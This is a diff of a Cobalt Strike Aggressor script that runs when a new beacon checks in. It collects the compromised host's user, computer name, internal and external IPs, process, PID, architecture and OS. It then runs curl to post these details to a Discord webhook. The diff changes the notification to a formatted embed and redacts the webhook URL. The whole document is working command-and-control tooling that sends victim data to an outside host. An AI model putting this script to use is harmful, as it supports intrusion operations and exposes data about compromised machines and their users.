@@ -1,20 +1,38 @@
-# Based on the work of 
-# @sec_groundzero which is based on the work of @bluescreenofjeff
-
-$discord_webhookURL = 'https://discord.com/api/webhooks/*******************************************************';
-$teamserver_hostname = 'CobaltKitty';
+# Based on the work of @sec_groundzero which is based on the work of @bluescreenofjeff
+$discord_webhookURL = '*******';
+$teamserver_hostname = 'CobaltParrot';
 
 on beacon_initial {
-        $user = beacon_data($1) ["user"];
-        $arch = beacon_data($1) ["barch"];
-	$computer = beacon_data($1)["computer"];
-	$internal = beacon_data($1)["internal"];
-	$external = beacon_data($1)["external"];
-	$listener = beacon_data($1)["listener"];
-	$process = beacon_data($1)["process"];
-	$pid = beacon_data($1)["pid"];
-        @curl_command = @('curl','-X','POST','-H','Accept: application/json','-H','Content-Type:application/json','--data','{"content": "Initial Beacon ' . $teamserver_hostname . ', '.$1.' -> '. $user.'@'.$computer.'/'.$internal.'/'.$external.'/'.$listener.'/'.$arch.'/'.$pid.'/'.$process.'"}',$discord_webhookURL);
-        exec(@curl_command);
+    $user = beacon_data($1)["user"];
+    $arch = beacon_data($1)["barch"];
+    $computer = beacon_data($1)["computer"];
+    $internal = beacon_data($1)["internal"];
+    $external = beacon_data($1)["external"];
+    $listener = beacon_data($1)["listener"];
+    $process = beacon_data($1)["process"];
+    $pid = beacon_data($1)["pid"];
+    $os = beacon_data($1)["os"];
+    
+    $message = '{"embeds": [{
+        "title": "🎯 New Beacon Check-in",
+        "color": 3066993,
+        "fields": [
+            {"name": "Host", "value": "`' . $computer . '`", "inline": true},
+            {"name": "User", "value": "`' . $user . '`", "inline": true},
+            {"name": "OS", "value": "`' . $os . '`", "inline": true},
+            {"name": "Arch", "value": "`' . $arch . '`", "inline": true},
+            {"name": "Process", "value": "`' . $process . ' (' . $pid . ')`", "inline": true},
+            {"name": "Listener", "value": "`' . $listener . '`", "inline": true},
+            {"name": "Internal IP", "value": "`' . $internal . '`", "inline": true},
+            {"name": "External IP", "value": "`' . $external . '`", "inline": true}
+        ],
+        "footer": {"text": "' . $teamserver_hostname . ' | Beacon ID: ' . $1 . '"}
+    }]}';
+    
+    @curl_command = @('curl', '-X', 'POST', '-H', 'Content-Type: application/json', 
+                     '--data', $message, $discord_webhookURL);
+    exec(@curl_command);
 }
+
 
 
